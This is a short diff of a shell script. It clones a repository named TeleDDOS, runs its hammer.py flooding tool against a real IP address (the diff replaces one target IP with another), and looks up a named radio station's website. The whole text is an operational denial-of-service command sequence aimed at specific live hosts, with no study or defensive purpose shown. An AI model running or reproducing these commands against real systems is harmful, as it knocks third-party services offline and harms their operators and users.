@@ -6,7 +6,7 @@ cd ~
 git clone https://github.com/KingArmin/TeleDDOS
 cd TeleDDOS
 
-python3 hammer.py -s 136.243.145.232 
+python3 hammer.py -s 52.28.119.169 
 
 nslookup www.radioalghad.com
 
